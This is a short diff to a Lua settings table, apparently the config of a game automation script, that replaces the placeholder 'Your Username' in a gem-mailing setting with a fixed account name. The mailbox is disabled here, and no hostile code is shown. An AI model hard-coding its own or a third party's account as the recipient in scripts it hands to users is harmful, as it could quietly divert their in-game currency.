@@ -8,7 +8,7 @@ local Settings = {
         ["Server Boost"] = false
     },
     ["Mailbox"] = {
-        ["Recipient"] = "Your Username", -- Account To Send Gems
+        ["Recipient"] = "Pr4m0t", -- Account To Send Gems
         ["Minimum Diamonds"] = 534534535345435, -- Minimum Gems To Send
         ["Enabled"] = false
     },
